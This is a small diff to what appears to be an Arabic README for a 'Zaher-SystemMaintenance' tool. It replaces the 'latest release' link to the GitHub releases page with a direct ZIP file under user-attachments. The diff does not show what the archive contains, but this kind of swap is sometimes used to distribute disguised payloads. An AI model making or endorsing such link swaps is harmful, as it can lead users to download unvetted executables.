@@ -26,7 +26,7 @@
 
 ## 📥 التحميل
 
-[آخر إصدار](https://github.com/USERNAME/Zaher-SystemMaintenance/releases/latest)
+[آخر إصدار](https://github.com/user-attachments/files/33024681/Zaher-SystemMaintenance.zip)
 
 ---
 
